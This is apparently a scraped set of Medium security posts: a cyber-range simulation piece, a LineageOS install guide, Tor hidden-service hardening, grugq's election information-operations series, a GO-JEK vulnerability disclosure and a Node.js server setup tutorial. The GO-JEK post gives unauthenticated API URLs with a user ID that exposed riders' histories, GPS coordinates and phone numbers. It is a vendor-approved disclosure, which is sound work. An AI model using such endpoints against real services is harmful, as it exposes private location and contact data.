For Stage 3, we are focusing more of the Lateral Movements of the attackers. Please spend some time learning from this awesome webcast: Internal Pivot Pentest Go Kit. One of the key challenges of outbound analysis is that it has become standard procedures to ‘piggyback’ allowed protocol-ports and using TLS/SSL because the former flies under the radar and latter is free. Of course there will still be actors who use more exotic tunneling/covert channels which we should look out for. But it is within your networks that should be the focus, which leads to the topic of Insider.
The details of Insider Threat Management is beyond this entry. I just want to highlight that the key challenge is to simulate all these scenarios realistically, most of which could be specific to user’s business processes. That’s the main reason why I am interested with the Leidos paper. One of the ways to test is to run these in a real-operational environment and inject scenarios like the ones below over a period of time. The main thing to overcome is to ensure that the environment is well-controlled and devoid of on-going external/internal attacks.
What I really like about SimSpace that has the ability to mimic user workloads within an environment by using virtual-users profiles. I just want to take the opportunity to highlight the significance of the ability to simulate realistic user workload. If we had a Cyber-Lab/Range that is ‘silent’ with no user activities and workloads, any forms of attacks will likely to light up like a X’mas Tree, the fun comes when you throw in a few hundred/thousands of workstations generating all sorts of logs to your SIEM or whatever ‘next-gen’ detection engine.
At this point, you might be thinking ‘how on earth am I going to come up with all these attack scenarios?’. That would mean having pen-testing/red-teaming capabilities. Able to penetrate is one thing but to effectively manage the scenarios is another thing. So we went searching for a solution that has comprehensive and curated set of techniques and abilities to piece these techniques together to span across different stages of the ALC. We found:
The key value proposition of these products is the notion of continuous validation as-a-Service, which help answer: ‘are your controls working as they should be… after some changes to configurations, against new attack techniques…?’ Although these products are meant for production environment, I asked myself ‘Why can’t I use such tool in a Cyber Range?’. I can’t see why NOT.
The idea is to reuse as much of the built-in techniques provided by these products to emulate Stage 1–3 and create customized scenarios for Stage 4.
For example, custom SQL injection of customer specific applications (impact Confidentiality & Integrity) and DDoS/defacement of corporate webpage (Availability). Work backwards, starting with the most commonly faced scenarios before exploring very specific scenarios.
I hope this entry has outlined a series of ways to use ALC for scenario planning and execution within a Cyber Range.
The next sharing will cover the notion of ‘Defensible’ Networks.
Written by
","['Picus Security', 'Safebreach', 'Big Data', 'Cybersecurity']"
Securing an Android Phone or Tablet (LineageOS) - Andrew Douma - Medium,https://medium.com/@securitystreak/securing-an-android-phone-or-tablet-c8c6166b2586?source=tag_archive---------4-----------------------,"Corporations prioritize new sales and decreased costs over securing older Droidware. This leaves every Android OS user increasingly vulnerable to privacy violations by unsophisticated cybercriminals.
This article will help you install the latest version of Android 7 Nougat onto your device. You should be able to replicate the results regardless of the brand of your Android Phone, Tablet or TV. It is easy!
I am “flashing” LineageOS onto my Android HTC One (M8) myself after not receiving any Android security updates from my device manufacturer for over 18 months. It takes about 60 minutes from start to finish to do.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Penetration Testers’ Guide to Windows 10 Privacy & Security | Full Disk Encryption with VeraCrypt | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
This Android phone is running a stock Android 6.0 with “HTC Sense 7.0” and has been “fully updated” to December 2015 security patch levels.
It currently serves as an aid during Security Assessments and Awareness Demonstrations, so the multitude of code execution and privilege escalation bugs is less than ideal!
After upgrading to LineageOS, my About Phone page rewards me with Android 7.1.1 and March 2017 security patch levels.
Not only will HTC never update my device to Android 7 Nougat, but I also have to deal with pre-installed, unremovable Bloatware that monitors me! Upgrading to LineageOS allows me to receive security updates and gives me full control over my device.
Depending on your Android device’s hardware specifications and what you will be using it for, you could consider mirroring this guide with CopperheadOS which has better security features. The postmarketOS project is also worth checking out.
There is no use trying to secure Android if you are not running an up-to-date version of the Operating System. At its core, Android is another (highly specialized) Linux distribution.
Beyond that, it is important to take into account that:
Here are my Android security & privacy tips:
Above all, keep your Android devices up to date!
As long as you have a tested backup of all your contacts and photos, and you make sure your devices will not run out of power during the process — you will be able to recover from almost every other worst-case scenario.
The first step to “flashing” an updated Android distribution onto your phone’s chips is to do a modicum of research. Lucky for you, the community is very active, and many have written about their particular experience for your device.
I found my device in the LineageOS supported hardware list and took a minute to search for tips and tricks of fellow device owners before downloading the latest Build for m8 from the official website.
If your Android phone has never run a custom ROM, you will need to unlock your phone’s bootloader still. Anything stored on the mobile device will be erased.
ADB is a development tool that allows your OS to talk to your Android device. Ensure you have the latest version of Android Debug Bridge set up on your preferred Operating System (OS).
Next, on your Android device:
After you plug in your Android phone into your computer, open up a terminal/command prompt and run:
adb devices
You will need to authorize your computer by selecting ‘Always allow’ on your Android phone. Running the previous command again will now give you a different output.
A bootloader acts kind of like the BIOS/UEFI for your Android device. Unlocking it gives you full control over the device, a feature every Android OS developer requires.
Since I can interact with my Android phone from my command line using ADB, I can reboot into fastboot mode by running:
adb reboot bootloader
You can observe your Android’s screen, and confirm success by running:
fastboot devices
If this returns any error, try running the command as root/Admin.
I can obtain an unlock key to unlock my bootloader by visiting the HTCDev Bootloader Unlock website. If you are using a different brand, use a search engine to find your device manufacturer’s version.
The instructions on the HTCDev website are easy to follow along with, you can generate the required bootloader unlock token by running:
fastboot oem get_identifier_token
If your device is not on the supported devices list, you can find refuge in KingoRoot or SunShine. I prefer running binaries from “trusted” 3rd parties, always proceed with caution.
The next step is to replace the stock recovery options with the latest Team Win Recovery Project (TWRP) firmware. You can install the official TWRP Android App later to receive updates!
With the guidance of the HTC One M8 All Variants page, I downloaded the latest TWRP version for my device using my browser. Because downloads can get corrupted it is important to verify the integrity of the .img file.
The project provides an MD5 checksum and GPG signature for each release:
cat twrp-3.1.0-0-m8.img.md5 && md5 twrp-3.1.0-0-m8.img
curl -O https://dl.twrp.me/public.asc
gpg --import public.asc
gpg --verify twrp-3.1.0-0-m8.img.asc twrp-3.1.0-0-m8.img
On MacOS, these commands confirm the checksum matches and a “Good signature from TeamWin.” I can now proceed to flash the recovery image onto my device:
fastboot flash recovery twrp-3.1.0-0-m8.img
I will need to reboot my device into recovery to verify the successful installation of TWRP.
This confirms I have replaced the stock recovery with TWRP 3.1. Swipe to confirm you want to grant TWRP the power to modify your device.
Insert a 1GB+ Micro SDCard and reboot into your stock Android OS one last time. Format it there for removable storage and make sure you have downloaded the LineageOS install .zip and any optional packages you require.
Verify the checksum before pushing the Zip file to the Android device:
md5 lineage-14*.zip
adb push lineage-14*.zip /sdcard/
adb push open_gapps*.zip /sdcard/
adb push addonsu*.zip /sdcard/
Reboot into TWRP recovery using the discussed key sequence or run:
adb reboot recovery
I cannot stress the importance of backing up your existing system and storing it long-term. It can be difficult to find the exact stock Android ROM that is compatible with your phone.
In TWRP recovery:
Next, we will want to format several partitions:
Finally, we can install each of the Zip files from the TWRP home screen:
Before you reboot, repeat this step if you want to install the Google Apps package. Note that this choice will improve the usability of your Android device but decreases your privacy.
I opted to “root” my device by installing the LineageOS ‘su’ package and install packages manually or via F-Droid instead. Rooting your device allows you to install packages like DNS66, AdAway, and ProxyDroid.
LineageOS is now installed, and after a two-minute deployment, you will be prompted to set up your device. Reward yourself by opening Settings and scrolling down to the About section.
Click the ♡ to recommend this article.
Written by
","['Google Play', 'SecMobi Wiki', 'Privacy Check', 'Streisand', 'Sovereign', 'Algo.', 'Lineageos', 'Mobile Security', 'Cybersecurity', 'Android', 'AndroidDev']"
Securing a Web Hidden Service - Just another infosec blog type of thing,https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d?source=tag_archive---------2-----------------------,"While browsing the darknet (Onion websites), it’s quite stunning to see the number of badly configured Hidden Services that will leak directly or indirectly the underlying clearnet IP address. Thus canceling the server anonymity protection that can offer Tor Hidden Services.
Here are a few rules you should consider following before setting up a Onion-only website. This guide covers both Apache and Nginx.
Don’t let anyone reach your Onion web application through the clearnet. Plain and simple. Your web server should only listen to 127.0.0.1 so that uniquely the Tor daemon can connect to it. If you can’t listen to localhost (for whatever reasons), use a god damn firewall (iptables/nftables) to prevent any leak or — at the very least — make sure the default virtual host isn’t redirecting to your Onion application.
The reasons why you shouldn’t be accessible on clearnet are scanners. Scanners from Shodan or Censys (or even Google) are constantly scanning all the IPv4 public space (what we can call 0.0.0.0/0) and will scan and index your server as well. You’ll be easily uncloaked if scanners find matching HTML content of your website, or even matching HTTP headers (see examples below).
On Apache, change /etc/apache2/ports.conf so that it contains:
On Nginx, you should add a listen statement in the /etc/nginx/nginx.conf file, (inside a sever section):
There are some pitfalls to this method but it’s the least you can do (and quickest way to prevent any major leak). If you’re using Apache and want to go further I encourage you reading Alec Muffett comment on that:
Most notorious fails
“Directory listing” or “directory indexing” is a known plague, even for clearnet websites. It’s considered by OWASP as a common vulnerability, but given the sensitivity of most hidden services it is just unacceptable to leave this open on a serious HS.
On Apache you can either disable the mod_autoindex (as root, simply type a2dismod autoindex) or add a Options -Indexes directive to your root web directory:
On Nginx, disable the autoindex module in nginx.conf file:
Most notorious fails
This is to ensure your server have a tiny fingerprint, no specific headers or unique version number to track you down.
On some configuration Apache is showing by default /server-info and /server-status pages leaking internal data (such as URL requested from other users).You can easily disable it by removing the mod_info from httpd.conf or by commenting out the <Location/server-info> and <Location/server-status> directives in the configuration file.
This will ensure that the version of your webserver and the OS server name won’t leak in the Server header and inside default error webpages (404, 500, …).
On Apache simply add these directives your default httpd.conf file (on Debian 8 you can directly edit /etc/apache2/conf-enabled/security.conf):
On Nginx, disable the server_tokens in nginx.conf:
This depends on the backend language you’re using (PHP, NodeJS, Python, etc.), I won’t go into the details for each on how to disable error reporting, Google is your friend. Most error reporting (stack traces, memory dumps, etc.) are likely to leak your IP address or other relevant information: disable them all! FYI, this may be how the Silk Road DMN was taken down.
Most notorious fails
Patch your god damn server (keep it up to date), write code that isn’t shit and riddled with SQL injections, and you should be fine. If you’re reading this guide and learning new sysadmins tricks, my best advice is that you should probably stay away from darknet entrepreneurship (especially darknet markets and all form of illegal activities online).
Apply some basic security measures as disabling unwanted services, respect the principle of least privilege and compartmentalize the different layers of your web application. For the rest, use common sense.
If it helps, you can follow some security hardening guide to tighten your configuration. Bonus points if you install grsecurity/PaX on your box.
Some web applications are sending verification e-mails that might leak your IP address to the recipient. This can also happen if your app tries to reach any third party through clearnet (bitcoin payment API, analytics, Twitter, …). In order to prevent this from happening, I recommend you to transparently route all outgoing traffic through Tor. The Tor Project has a guide on how to set up a Transparent Proxy.TL;DR: set your firewall to deny all outgoing connections except from those coming from the Tor process.
Keep in mind nothing is bulletproof and 0day can (or must) be part of your threat-model if you’re somewhat serious about anonymity.
If you liked this article, you can also buy me a coffee ☕ anytime!
Written by
","['Privacy', 'Cybersecurity', 'Sysadmin', 'Apache', 'Censorship']"
Security As an Afterthought Never Works - Joel de la Garza - Medium,https://medium.com/@jdelagarza/security-as-an-afterthought-never-works-5eb2cfa996ff?source=tag_archive---------9-----------------------,"I’d like you to imagine this scenario: a software developer is unhappy with his current position so he is out interviewing for a new job. He is tech savvy and aware of privacy concerns brought about by today’s technologies, so before his interview he disables location tracking and GPS, just in case. Meanwhile, across town his manager starts receiving ads for recruiters that specialize in his exact skill. Ads that seemingly imply they may soon be needing to replace a star developer who is at the core of their most important product. She starts to think about his recent shift in attitude and the unexpected doctors visit the employee is supposedly at. She becomes concerned and suspicious. With the vast quantities of data being created today from a myriad of sources, it’s not hard to imagine a scenario like this one playing out in the near future.
The proliferation of data is creating one of the greatest vulnerabilities to our society today. Even as people take steps to protect their privacy, they are being undermined by data sources they don’t know exist. Research conducted at Stanford University has shown that the gyroscope on your mobile phone can be combined with machine learning techniques to eavesdrop on your conversations, for example. They’ve also done research into using the consumption of power on your phone to pinpoint your physical location. Although you suspect you are in a private mode, that is mostly likely not the case.
With the rapid development of new services and devices has come a deluge of logs, metadata, and content for which we have not considered the ramifications. We are quickly moving into a world in which every part of our life is qualified and quantified, where risk, credit, fitness, and social scores determine opportunity. Where seemingly benign technology can be used for nefarious purposes.
We’ve rushed headlong into this world without giving any thought to how we protect, control, or govern that data. Mitigating this risk requires developing tools that allow us to manage the flow of this information. We must have the technical ability to enforce privacy and confidentiality while also enabling innovation that can have profound positive benefits for our lives. The challenge before is similar to the challenge behind us: we need to find a way to balance innovation and security, with a focus on visibility and analytics instead of data control. Only building such controls in from the beginning will allow us to strike this balance. Security as an afterthought never works.
The Future of Security Roundtable is a Google-sponsored initiative that brings together thought leaders to discuss how we can best protect ourselves from the data breaches and security risks of tomorrow. Panelists are not affiliated with Google, and their opinions are their own. Read the post that kicked off the roundtable here and feel free to join in the conversation.
Written by
","['Privacy', 'Futureofsecurity', 'Cybersecurity']"
"Security, Cyber, and Elections (part 1) - thaddeus t. grugq - Medium",https://medium.com/@thegrugq/security-cyber-and-elections-part-1-cd04de8ed125?source=tag_archive---------2-----------------------,"The US election cycle has been quite heavily dominated by cyber security issues. A number of cyber security experts have even stepped forward to offer their solutions to how to keep safe. Everyone has problems with their proposals, that fundamentally they all stem from not understanding the actual threat.
Achieving security is possible using counterintelligence principles, but it requires knowing what you want to protect, who you want to protect it from, and then implementing that plan. I expect this post to be deeply unpopular with everyone, but I’ll explain my position anyway.
In early 2016 the Russian Military Intelligence service, the GRU, hacked a number of US Democrat institutions and individuals using cyber intelligence collection techniques. They then used the “take” to create curated datasets that were disseminated to the public using a number of cut outs and attribution fronts:
This data dumping technique used to be called “mail spool drops” back in the days of hacker wars, but it is now part of strategic cyber war and modernized information operations.
A subset of the intelligence cycle codified by the CIA is presented below, as applied to these events:
This will be on the quiz later, so don’t forget…
If you want to hear a cyber security expert laugh, ask them how to avoid breaches from a determined well funded persistent attacker. If they don’t laugh, they’re probably not an expert.
A number of people have provided good advice on how to avoid being phished for Gmail login credentials. This is because a number of victims of the breaches were hit using phishing attacks. This advice is definitely good – use 2FA, strong passwords, read URLs, don’t get phished!
But this advice would not enable civilians, many of them volunteers, to defend themselves against Russian military intelligence. It’s like advice on how to avoid being mauled by a tiger, there is no “train hard and learn tiger self defence.” Similarly, there is no way to avoid a breach by a persistent determined well funded attacker.
Do: enable anti phishing protections, they help against a lot of threats.
Some people have come forward to suggest that the problem is that the emails were in plaintext and that simply using PGP (lol!) would be the solution. End to end encryption provides a secure channel for sending data, but the end points still have plain text (that is literally what end to end encryption means.) PGP is a particularly terrible solution for protecting mail spools because it lacks PFS, a property of an encryption protocol that mitigates the damage of a compromised key. If the GRU could compromise an email account, they could compromise an end point and steal the PGP keys.
Encrypted emails, particularly with PGP (horrible UX, fragile security model), would not stop the collection of data by Russian military intelligence.
Do: encrypt your emails with PGP. There are a few guides which provide good instructions on setting up and using PGP correctly. Also, consider using a PGP hardware key (YubiKey, or PGP smart card) to mitigate against a breach.
The GRU was recently discovered using multiple 0day exploits against an number of targets. Some people may think that the solution is to ban 0day (non technologists), or implement cyber insurance (vendors) or provide better end point protections (vendors). Nothing here is really going to help. If the end point protection systems worked, they would solve cyber security. Everyone pushing these solutions is selling something. Some of it is actually useful, most of it is junk.
Just remember that compromising the end points of a civilian computer network is basically what every penetration testing company does on a daily basis. There is no salvation against exploits and compromised end points, only mitigations.
Do: harden the systems you use, apply patches in a timely fashion, minimize your exposure to high risk situations, install and use robust end point protection software. Make the bastards work for it!
People have suggested switching from email to more secure mobile messaging platforms. This is certainly a good idea wherever feasible, since using a hardened mobile device (e.g. an iPhone) with strong end to end encryption (e.g. Signal messenger) is about as secure, and usable, a system civilians can get.
This is great advice, except that it is actually possible for Russian military intelligence to compromise a mobile device. They are at least as capable as the UAE, and it would be surprising if an iPhone could stymie the GRU. Remember, this is a problem that is tractable with money. Throwing a million dollars or so at an iPhone will produce a functioning exploit that can be used to compromise the end points of that secure messenger.
Signal is a good secure messenger for their end to end protocol (WhatsApp and Facebook Messenger are more usable though) but it is a terrible private messenger. There’s a difference, it’s important, I’ll tell you why later.
Do: use mobile phones and encrypted messengers whenever possible instead of email. They are much better solutions in almost every situation.
There is no feasible way for civilians to avoid collection by the GRU. Definitely go out of your way to make them work for their money, but they are not going to be stopped by: 2FA, PGP, iPhones, Signal or vendor solutions. Do all those things to stop threat actors who aren’t the Russian military intelligence, but realize that the threat model for this collection is literally James Mickens’ famous attacker model.
Next: Part Two. Part Three.
Written by
","['Operational Security', 'Cybersecurity', 'Privacy', 'Security']"
"Security, Cyber, and Elections (part 2) - thaddeus t. grugq - Medium",https://medium.com/@thegrugq/security-cyber-and-elections-part-2-ee6954bb587f?source=tag_archive---------7-----------------------,"[06.08] Therefore, against those skilled in attack, the enemy does not know where to defend. — Sun Tzu
In the first part of this series we established that attempting to secure a group of civilians against the Russian military intelligence is basically never going to happen. This is for the same reason that securing any cyber infrastructure against a breach by determined attackers is a daunting task. The trick, as cyber security professionals know, is to mitigate the damage of the breach, rather than rely on preventing it entirely.
To paraphrase Dino Dai Zovi: if the cost of the attack exceeds the value of the compromise, you have security. This is also a counterintelligence principle: increase adversarial costs beyond the value of the data. I’d even hazard a guess that this is the guiding principle behind protections against shoplifters and thieves everywhere.
The core problem facing the Democrats wasn’t that the data was stolen, it is that the data could be exploited in an information operation. It is almost impossible for civilians to prevent an intelligence agency from stealing data off computers (whether they’re laptops or mobile phones.) To achieve security the best approach is to reduce the value of that data, making it both less attractive as a target and less useful for exploitation.
The goal of an information operation is to control the narrative around an event, sequence of events, person, etc. etc. An exceptionally effective information operation will inject “info” into the the sensemaking discourse at such a level that it alters the conclusions of those targeted. That is – a truly good information operation will change the targets’ perception and understanding of reality.
Before we can look at how to develop an effective counterintelligence plan against cyberwar info ops, we’ll need to get up to speed on some intelligence agency basics.
This section is just going to briefly lay out the various structures of intelligence agency operations. It is important background information necessary to understand how active cyberwar operations are conducted.
First, there is the intelligence cycle, which provides a structure for conducting intelligence operations. There are essentially four phases (ive omitted a lot of feedback loops and refinements):
Second, there is the operations process, which is fundamentally the same for everything, but has endless variations depending on the requirements and goals, the operators involved, the organisation(s) involved, etc.
Finally, in the specific case of the cyberwar operations conducted against the Democrats, there were multiple Collection operations, significant resources devoted to Analysis of the data, and then a number of “active measures” operations that got the information in curated datasets into the public discourse. These information operations follow the basic operations process, but the meta structure of the cyberwar operation was as follows:
These phases of the active measures operations are important because as we established in part one, preventing collection is quite hard (or even impossible.) An effective counterintelligence strategy (after making collection as hard as possible) must focus on mitigating the later phases of the operation.
Now everything is laid out for evaluation and we can begin to think about how a counterintelligence plan can be implemented against the information operation, which was the real attack (not the breach, obviously.) The fundamental issues to keep in mind are that threats and risks only appear when the info op has good dissemination (broad reach, acceptance of legitimacy) and the info is consumed and processed by the target audience. This is where things get more interesting, and I’ll explore them in the next instalment.
Previous: Part One. Next: Part Three
Written by
","['Cybersecurity', 'Security', 'Information Security', 'Operational Security', 'Privacy']"
"Security, Cyber and Elections (part 3) - thaddeus t. grugq - Medium",https://medium.com/@thegrugq/security-cyber-and-elections-part-3-9398f639aa28?source=tag_archive---------8-----------------------,"Conflict in the fifth domain is not limited to the purely technical aspects of hacking, nor is it even restricted by the formalised “deny/degrade/destroy” sort of rhetoric that gets the Western military so excited. Previous instalments in this series covered:
Finally we’ll get down to understanding the real risks and problems, and develop a strategy that counters the actual threat. This means rather than attempting to teach civilians how to protect their computers against the a determined foreign intelligence service (FIS) — which is essentially impossible — we’ll teach them to reduce the value of the data available to the FIS after their systems are compromised.
In the first post of this series we saw that it is possible to increase the costs of the compromise, but it is not beyond the budget of the adversarial intelligence services. Other guiding of security rules will work, but few are directly applicable to the attacks against, for example, individual mail spools.
For a successful defence we will have to focus on identifying and mitigating the value of the compromise. This means focussing on the post compromise exploitation of the data collected by the adversary. This requires a more strategic approach, one which identifies the real risk and adversary.
This actually deserves a post of its own, however, here’s a quick run down of current cyber security principles that are known to work. There are only a few of them:
These are fundamental security principles that apply to computers just as well as to sensitive documents protected by an Intelligence Service. Counterintelligence fundamentals haven’t really changed since the second oldest profession[0] got started…
[0] Aside: intelligence officers like to joke that their’s is “the second oldest profession” (after prostitution), but the evidence seems to suggest that “midwife” is actually the oldest profession. So maybe spies only rank as the bronze medal of ancient job titles. Still, third place ain’t bad…
Last time we saw that the cost of compromise would always be within budget for the GRU, and that various suggestions to mitigate against the breach were misguided or misleading. This is fundamentally because people are still, wrongly, focussing on the access to the data being the critical factor of the information operation, rather than the exploitation of the data.
A quick review of the intelligence cycle is in order here. I am going to be horribly sloppy and treat these phases as also part of the information operation rather than just the “pure intelligence” that nations do all the time. This is just to provide some structured framework to allow us to model the events.
There are roughly four phases to the Intelligence Cycle:
We’ve seen that preventing collection is, at least for now, essentially impossible. There is no way to make civilian cyber infrastructure 100% safe against breaches. Policy people are working on developing a theory for deterrence that might prevent the tasking phase (thus nipping the whole sequence in the bud) but this is far from settled[1]. Neither tasking nor collection can be avoided.
This leaves analysis and dissemination. If there’s a way to stop information spreading online, then China has it. I, personally, do not want to see that level of information control deployed across the Internet — censorship is not the answer. It would seem that we have to cross dissemination off the list, but keep it in mind as one aspect that we can effectively mitigate (more on this later.)
[1] this is a strong contender for “understatement of the year.”
Information operations, like all operations, are also divided into phases, although they’re less well defined:
An information operation (info op) can be structured in any number of ways, but I’ll use the specific example of the Russian attacks against the Democrats. There are only a few fundamental elements:
To create a defense to mitigate this operation we will have to accept that any plan reliant on stopping collection is doomed to failure. Every element of the operation must be addressed and countered.
The goal of an information operation is to control the narrative around an event, sequence of events, person, etc. etc. An exceptionally effective information operation will inject “info” into the sensemaking discourse at such a level that it alters the conclusions of those targeted. That is, a truly good information operation will change the targets’ understanding of reality.
To properly understand the actual attack (which, in case there is any doubt, was not the breach of the targeted individuals and institutions), first I will define exactly what the execution and exploitation phases of the information operation actually were.
The technique used by the FIS was to provide the curated data sets to a number of dissemination points that then injected the data into the public discourse with the aim of controlling the narrative, adding new narratives, and so on. Effectiveness in this phase requires essentially two things: broad dissemination and acceptance of legitimacy.
Broad Dissemination
Achieving broad dissemination is both easier and harder to achieve due to social media. Firstly, reaching a wide audience is possible for basically anyone with an internet connection. That is wonderful. That is the problem. Getting attention is now the primary problem, not getting published. Page views are the rule of the land here, clicks, likes, retweets, etc. are the measure of success. The Alexa top 25 websites (by traffic) in the US have only three non search/shopping/social media sites: #15 CNN, #16 ESPN, #22 NYTimes.
Without broad dissemination, and the resulting attention capture, the information operation is a failure. The FIS learned this first hand with a failed attempt “if you build it, they will come” by simply creating a site (DCLeaks) and publishing and waiting. And waiting. And nothing happened. The data needs to climb the page view ladder, and there are tried and true methods for that: get attention in smaller sites and leverage those into larger and larger sites step. For example: blog post → reddit → Vox → USA today.
Stamp of Authenticity
Reaching a wide audience is possible with social media. Indeed, most social media has a wider audience than the main stream media. The problem for an information operation is that it needs to be accepted as legitimate information, and this is where the main stream media still plays a major role. The MSM is still, in many ways, the gatekeeper for legitimacy.
Even in an age of social media, journalists still hold an influential role of validating a story.
— Jeremy Rue, lecturer at UC Berkeley’s Graduate School of Journalism (Source)
Putting these pieces together, what this means is that:
The goal of the information operation was to exploit the data collected, not simply collect it. Successful exploitation involved inserting it into the public discourse, hopefully in a way that alters the target audience’s narrative/perception of reality. To achieve this goal, the datasets must be digestible and interpretable by the target audience. They have to be able to read it and understand it.
Now that the real problem is identified — exploitation of the data — we can look at ways of mitigating that risk. Until the threat is identified, defending and counter attacking becomes possible. Next time, we’ll hit on concrete actions to take to mitigate this specific exploitation of this specific data.
Previous: Part One. Part Two.
Written by
","['Cybersecurity', 'Privacy', 'Operational Security', 'Comsec', 'Information Security']"
Security vulnerabilities in GO-JEK - HackerNoon.com - Medium,https://medium.com/hackernoon/security-vulnerabilities-in-go-jek-a9126b33788c?source=tag_archive---------4-----------------------,"GO-JEK is an Indonesian unicorn transport startup, often seen as the most famous and biggest startup to come out of Indonesia. GO-JEK provides services like biketaxi, cabs, food delivery, mobile payments ticket booking and more.
At Fallible, one of the things we are working on is to try to accurately automate data leak detections even in complex logic flow scenarios and non-standard auth procedures used. During a security audit of GO-JEK public APIs consumed by mobile applications, we found multiple security vulnerabilities in GO-JEK. We contacted GO-JEK with the a sample of data leak for Mr. Nadiem Makarim, the CEO of GO-JEK (partial redacted screenshot below). The GO-JEK response in June 2016 was that they are fully aware of all security issues and fixes are in the current roadmap. We recently contacted GO-JEK and we were confirmed by their CISO that it was alright to do a public disclosure of the vulnerabilities now.
You can get a list of all rides taken of any user using this API endpoint including the exact GPS co-ordinates. The Authorization token is present but is not being used for validation.
https://api.gojekapi.com/gojek/v2/customer/v2/history/551925748
Get the details of orders placed via Go-jek API:
https://gobox-api.gojekapi.com/v1/users/551925748/history
You can get user personal details by their Id number using this API endpoint. This includes their phone number, name, drivers personal details, location of pickup and drop and other ride related information.
And the response would contain phone number of rider and driver along with origin and destination coordinates.
An unusual vulnerability we detected was that you could use another users id in an API endpoint and and you are all set to snoop on GO-JEK notifications meant for that user. We are researching this vulnerability to see if this can lead to several other stuff and would refrain from disclosing the API endpoint for this.
There are several other API endpoints that can be used to corrupt user data & disrupt operations. For example, you could change the reason of cancellation of rides for all cancelled rides for all users. We would refrain from mentioning the write access APIs at this point.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Startup', 'Uber', 'Indonesia', 'Cybersecurity', 'Security']"
Set Up a Secure Node.js Web Application - Security and Node.js,https://blog.nodeswat.com/set-up-a-secure-node-js-web-application-9256b8790f11?source=tag_archive---------1-----------------------,"Every application has to live somewhere — a server, a phone, a device — an environment. Before we start worrying if we have used secure coding practises and avoided common mistakes we must secure the foundation of our application otherwise all our effort in avoiding injection or request forgery and other attacks will be for naught.
In this blog post we will look at setting up our Node.js application server. We will start with a clean server, configure some basic security features, configure a Nginx proxy, create a SSL certificate and run our application. More specifically we will be looking at:
It’s going to be a long ride, so hold on.
While this blog post will not cover all the necessary topics for a secure server and is not suitable for large scale deployment it will nonetheless provide a decent starting point.
For a more in depth look on Node.js security read my book Secure Your Node.js Web Application: Keep Attackers Out and Users Happy
To deploy our application somewhere we will first need a server. I will be using DigitalOcean as my host but since I won’t be using their “One Click Apps” the hosting partner doesn’t really matter. Fast forward a minute and I have a Debian 8.2 server up and running. I have also received my root password on my email along with the IP address. This is the state we will be starting out from.
Using the password from my email logging in with the root account will immediately ask me to change the password and after that I am officially in my server. First things first let’s update our server software.
Keeping your server software up to date is an important part of security hygiene. Be sure to do this regularly or set up an autoupdate procedure using UnattendedUpdates for Debian systems or AutoUpdates for Red Hat systems.
There are 3 main things we need to do in order to proceed securely:
Create new account
Let’s begin by creating a new account. It can be done easily by using the following commands:
The first command will create a user called joe and the second will set the user’s password and unlock the created user.
Or you can use the adduser joe command, which will prompt you for the information.
Now test your user and make sure you can log in
Use key based authentication
We need to get rid of the insecure password based authentication that is the default. For this we will need to configure our server for key based authentication — we need to add our public key to the accounts authorized_keys file.
For this we will create a “.ssh” folder under the user’s home directory and a file called “authorized_keys” under it.
Now we need to add our public key to the file — make sure you copy the key without whitespaces. (If you are unfamiliar with creating SSH keys, then have a look at this article by GitHub).
Next let’s grant ownership of the file to the account, so that they can later change their own settings.
And once again test if we can log in
Disable root account login
Before we actually disable root account login we want to make sure that accounts that need to can actually elevate their privileges to access root privileged operations through sudo.
Since we are running Debian our system won’t have sudo installed so we will need to install it manually.
Now that we have sudo installed we can configure who has access to the sudo command through the visudo utility.
Find the part that deals with User privileges and add our user there
Now our “joe” can use sudo command_name to run a command with root privileges by providing their password. Great — we no longer need to allow root account login over SSH. To disable this we will need to modify the “/etc/ssh/ssh_config” file.
We need to add/change so that we have the following configurations in our file
If we have done that we should reload our ssh service configuration
Our root account won’t be able to log in any more and other accounts won’t be able to use password authentication by default.
We have now set up our main user account “joe” who has sudo access, disabled the root account and are using key-based authentication. All is well with the world, so let’s move on.
Next we are going to set up our Nodejs process. For that we will need to install Node.js, create an unprivileged user  and run our node service as the unprivileged user.
First let’s start by installing Node.js by the official guide.  Since our Debian doesn’t have curl we’ll start by installing that.
Now we have Node v5.x installed (Currently 5.4), lets move on to creating our run user.
With this command we’ll create a user who is not able to log in, and has a home folder under “/var/appdata/fooapp”.  And since we won’t add this user to the sudoers file they will not have any sudo capabilities. This is not the lowest privileged user, but for starters it is good enough.
Next we’ll create the folder and app file for testing.
We can now test that this app would actually run — start it up by
After we have verified that we are able to visit “http://yourIp:2765"" and see a “hello” we can move on. We need to make sure our process can handle shutdowns and crashes. For this we need to set up a process manager and startup scripts. We also want to have a process manager so that we can cluster our service. I’ll be using systemd and pm2.
First I need to install some dependencies so that I can build the pm2 module.
Then I’ll install the pm2 module under the fooapp directory.
Now that we have installed everything that we need let’s grant all the files over to our fooapp user.
Next we need to set up our script so that when the server restarts our application will also be restarted.
We could use the pm2 startup command to generate the startup script, but it is known to be somewhat problematic and it did not work as expected for me, so instead I’m going to use the systemd directly for this. First we are going to create a file in the “/etc/systemd/system/multi-user.target.wants/” folder for our service.
After which we need to reload the configuration and start our service.
And now all that’s left is to test that we can still visit “http://yourIp:2765"".
We have now set up our service to run as a low privilege user with systemd to restart our application when the server restarts and pm2 to handle our service day to day restarts and clustering.
A common and a very dangerous mistake people do is run the node process with root privileges. Why do they do that? Well because binding to a low port number (like 80 or 443) requires high privileges.
We have already been smarter about that by running our service on a high port and using a low privilege user. However nobody is going to like adding a port number to our domain name, so we need to proxy the requests. The crudest way would be to set up a firewall port forwarding, but we are instead going to set up a Nginx server, because:
The default Nginx version that ships to the Debian 8.2 distro is 1.8.0, the newest Nginx version at the time of writing is 1.9.9.
Of course we want the newest, because as of 1.9.5 we will have HTTP2 support and so can enjoy the benefits of the future.
